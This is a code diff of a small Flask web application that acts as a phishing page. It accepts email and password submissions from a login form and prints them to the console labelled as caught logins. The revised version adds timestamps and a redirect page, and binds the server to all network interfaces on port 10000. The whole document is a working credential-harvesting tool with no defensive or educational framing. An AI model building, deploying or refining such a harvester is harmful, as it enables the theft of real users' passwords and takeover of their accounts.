@@ -1,23 +1,21 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request
+from datetime import datetime
 
 app = Flask(__name__)
 
-@app.route('/', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        email = request.form['email']
-        password = request.form['password']
-        print(f"🕵️ Email: {email} | Password: {password}")
-        return redirect('/loading')
+@app.route('/')
+def index():
     return render_template('index.html')
 
-@app.route('/loading')
-def loading():
-    return render_template('loading.html')
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email')
+    password = request.form.get('password')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-@app.route('/error')
-def error():
-    return render_template('error.html')
+    print(f"[+] {timestamp} — Caught login -> Email: {email}, Password: {password}")
+
+    return render_template('redirect.html')
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=10000)
